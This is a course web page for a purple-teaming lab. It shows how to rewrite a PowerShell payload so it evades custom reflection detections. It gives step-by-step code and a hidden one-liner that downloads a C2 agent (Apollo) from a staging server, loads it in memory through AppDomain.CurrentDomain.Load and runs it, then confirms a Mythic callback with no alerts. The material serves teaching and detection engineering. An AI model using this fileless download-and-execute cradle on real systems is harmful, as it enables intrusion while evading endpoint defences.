---
layout: default
title: "Red Team Layout - Using Application Domain to Bypa"
permalink: /solo-purple-teaming/red-team-layout-using-application-domain-to-bypa/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Layout - Using Application Domain to Bypa</h1>
</section>
<section class="spt-content">

# Red Team Layout - Using Application Domain to Bypass Reflection Detection

Owner: Mike Sterrett

### **1. Context and Objective**

In the last lecture, we bypassed some brittle detections that were:

- **Correlation by process GUID** (dependent on two events — could be bypassed by avoiding dropping the binary in `Downloads`).
- **Time-based correlation** (image load + network connection within 2 seconds).
- **Unsigned image load from Downloads or Users folder** (bypassed via Run box execution).
- **Malicious PowerShell reflection detection** (our target for this session).

**Goal:** Rewrite our payload to use the `.NET` **current AppDomain** to bypass our custom PowerShell reflection detection.

---

### **2. Understanding Brittle Detections**

- **Definition:** Detections that rely on *low-level Indicators of Compromise (IOCs)* like:
    - File hashes
    - Specific IPs
    - Exact command-line strings
- **Why Weak?**
    - These indicators are at the bottom of the **Pyramid of Pain**.
    - Attackers can easily change them with little effort, causing minimal disruption.
- **Better Approach:**
    - Detect **high-level behaviors** (TTPs — Tactics, Techniques, and Procedures).
    - Focus on attacker methods rather than specific artifacts.

---

### **3. Quick Refresher on AppDomains**

- In Windows, a **process** is an isolated container for executing code, with one or more **threads**.
- **.NET adds:** The **AppDomain** — a lightweight container **inside** a process that:
    - Is created and managed by the **Common Language Runtime (CLR)**.
    - Isolates assemblies from each other.
    - Allows safe unloading of code without ending the process.
- **PowerShell Connection:**
    - When PowerShell runs, it creates a **default AppDomain**.
    - Assemblies can be loaded into it:
        - From disk **or**
        - Directly from a byte array (memory-only, no disk footprint).
    - Once loaded, assemblies can be executed using **reflection-like** techniques.

---

### **4. Lab: Rewriting the Payload to Use AppDomain**

**Starting Point:** The previous PowerShell payload.

### **Step 1 – Duplicate the Payload**

- Copy the last lecture’s payload into a new file for modification.
- Break each statement into its own line for clarity.

### **Step 2 – Download the Payload into a Byte Array**

```powershell
$b = (New-Object Net.WebClient).DownloadData('http://<staging_server>/apollo.exe')

```

### **Step 3 – Load into Current AppDomain Instead of Reflection Assembly**

Replace:

```powershell
$a = [System.Reflection.Assembly]::Load($b)

```

With:

```powershell
$a = [AppDomain]::CurrentDomain.Load($b)

```

### **Step 4 – Get the Execute Method**

```powershell
$m = $a.GetType('Apollo.Program').GetMethod('Execute')

```

### **Step 5 – Invoke Execute**

```powershell
$m.Invoke([Activator]::CreateInstance($m.DeclaringType), $null)

```

---

### **5. Combining into a One-Liner**

Because the Windows **Run** dialog allows only **259 characters**, we:

- Remove extra spaces.
- Chain commands with semicolons (`;`).
- Ensure all statements are inside a PowerShell script block.

**Final One-Liner Example:**

```powershell
powershell -w hidden -nop -c {$b=(New-Object Net.WebClient).DownloadData('http://<staging_server>/apollo.exe');$a=[AppDomain]::CurrentDomain.Load($b);$m=$a.GetType('Apollo.Program').GetMethod('Execute');$m.Invoke([Activator]::CreateInstance($m.DeclaringType),$null)}

```

---

### **6. Testing Step-by-Step**

1. **Run in PowerShell Line-by-Line**
    - Verify each line executes without errors.
    - Ensure Apollo callback is received in Mythic.
2. **Run the One-Liner in the Run Dialog**
    - Press `Win + R`, paste the one-liner, and hit **OK**.
    - Watch for PowerShell window flash and disappear.
    - Confirm Mythic callback appears.
3. **Debug if Needed**
    - Missing semicolons or exceeding character limits will break execution.

---

### **7. Verification**

- Check **Mythic C2** for successful agent callback.
- Review the **Solo Purple Teaming dashboard**:
    - Time range: Last 15 minutes.
    - **Result:** No detections fired → payload bypassed all custom initial access detections.

---

### **8. Key Takeaways**

- Brittle detections are easy to evade and shouldn’t be your only defense.
- Behavioral and TTP-based detections are more resilient.
- Using AppDomain’s `CurrentDomain.Load()` allows stealthy, in-memory execution without touching disk.
- Always test payloads step-by-step before finalizing into a one-liner.

---

### **9. Homework / Next Steps**

- Ensure your Run box payload **reflectively loads Apollo via AppDomain**.
- Verify bypass against Windows Defender and all custom detections.
- Read the attached research on **Service Configuration Management Objects**.
- Prepare for the next lab:
    - Writing a custom `.NET` service scan utility.
    - Running it with Apollo’s `execute-assembly` feature to bypass service enumeration detections.

</section>
</div>
